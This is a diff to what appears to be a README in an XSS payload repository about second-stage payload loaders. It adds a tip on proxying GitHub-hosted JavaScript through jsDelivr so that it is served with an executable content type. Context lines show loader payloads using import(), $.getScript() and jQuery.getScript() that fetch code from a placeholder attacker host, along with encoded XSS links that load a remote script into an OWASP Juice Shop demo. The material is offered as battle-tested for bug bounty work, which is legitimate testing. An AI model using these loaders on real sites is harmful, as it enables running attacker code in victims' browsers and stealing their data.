@@ -4,6 +4,13 @@
 
 <p align="justify">Although a lot of amazing online resources exist on the topic of XSS, none that i am aware of cover second stage payload loaders in more detail.</p>
 
+In case the second stage payload is hosted on GitHub (`Content-Type: text/plain`) and the loader payload requires `Content-Type: application/javascript`, use the following endpoint to achieve this conversion:
+
+* https://cdn.jsdelivr.net/gh/GITHUB_USERNAME/GITHUB_PROJECT_NAME/GITHUB_PROJECT_PATH/GITHUB_JS_FILE
+    * e.g.
+        * original: https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/basic/simplePoC/simpleStd.js
+        * proxied: https://cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS/basic/simplePoC/simpleStd.js
+
 * **NOTE**: this is not an exhaustive list - further payload options and options for modifying the payload exist
     * all payloads listed here are proven to work and have been battle-tested on Bug Bounty platforms
     * depending on the scenario, one may work over another
@@ -22,7 +29,7 @@ import('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
-## [jQuery; new] `$.getScript()` - round brackets; quote; dollar
+## [jQuery] `$.getScript()` - round brackets; quote; dollar
 
 ```
 $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
@@ -32,7 +39,7 @@ $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22%24.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
-## [jQuery; old] `jQuery.getScript()` - round brackets; quote
+## [jQuery] `jQuery.getScript()` - round brackets; quote
 
 ```
 jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
